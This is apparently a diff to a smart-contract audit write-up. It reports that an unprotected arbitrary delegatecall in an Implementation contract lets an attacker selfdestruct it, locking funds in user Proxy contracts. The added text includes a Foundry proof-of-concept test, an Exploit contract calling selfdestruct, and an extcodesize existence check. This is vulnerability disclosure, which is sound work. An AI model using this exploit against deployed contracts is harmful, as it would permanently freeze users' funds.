@@ -18,6 +18,73 @@ An attacker could delete the implementation contract deployed for user proxy con
 
 **Context:** [Implementation.sol#L9-L22](https://github.com/shabarkin/writing-exercise/blob/develop/src/Implementation.sol#L9-L22)
 
+While reviewing the Proxy and Implementation smart contracts I have observed that Implementation contract is defined as a normal deployable smart contract, this allows an attacker to cause the DoS attack for all users of Proxy contract.
+By application business requirment users should have ability to execute arbitrary `call` and arbitrary `delegatecall` functions by using their `Implementation` contract, however the current implementation of this has a side affect.
+
+The `delegatecall` function preserves the state of the calling smart contract, but executes logic of the called smart contract/library. In this architecture the `Implementation` smart contract is deployed as independent smart contract, what means that anyone within the Ethereum network could invoke their functions. 
+
+By deploying the malicious smart contract with a function, which defines `selfdestruct` operation, allows an attacker to "selfdelete" the `Implementation` contract. This may happen, because `Implementation.delegatecallContract` function uses `delegatecall` operation on the arbitrary address and arbitrary calldata. It will execute the logic of malicious function within the state of the `Implementation` contract, what means that the `selfdectruct` operation will be executed within the state of `Implementation` contract. 
+
+The denial of service attack is achieved, because there will be no way to update the implementation of Proxy contract or to withdraw the user funds. Upon deletion of `Implementation` contract, all users funds holded within Proxy contracts will be stuck there forever.
+
+The development and test running were completed with [Foundry](https://book.getfoundry.sh/) framework.
+
+
+Example of code snippet for the main exploitation business logic: 
+```solidity
+// Proxy and Implementation contracts deployment
+impl = new Implementation();
+proxy = new Proxy(address(impl), deployer);
+
+// send funds to deployer account
+(bool success,) = deployer.call{value: 1000 ether}("");
+if (!success){
+    revert("funds are not deposited");
+}
+
+// Exploit contract deployment
+vm.startPrank(attacker);
+exploit = new Exploit();
+vm.stopPrank();
+
+// critical: The implementation deletion
+vm.startPrank(attacker);
+
+// pack calldata for Exploit contract
+bytes memory _calldataExploit = abi.encodeWithSelector(exploit.destroy.selector, attacker);
+// delete implementation contract through delegate call on the `selfdestruct`
+impl.delegatecallContract(address(exploit), _calldataExploit);
+
+vm.stopPrank();
+ ```
+ 
+Example of the check to determine the existance of the contract:
+ ```solidity
+ function _checkContractExistance(address _contract) private view returns (bool){
+    uint256 size;
+    assembly {
+        size := extcodesize(_contract)
+    }
+    return size != 0;
+}
+ ```
+
+Example of the malicious smart contract:
+```solidity
+contract Exploit {
+    address immutable public owner = address(0x02);
+    address public implementation;
+
+    function destroy(address _to) public {
+        selfdestruct(payable(_to));
+    }
+}
+```
+
+Download:
+```
+git clone https://github.com/shabarkin/writing-exercise.git
+```
 
 Execute the exploit test with Foundry:
 
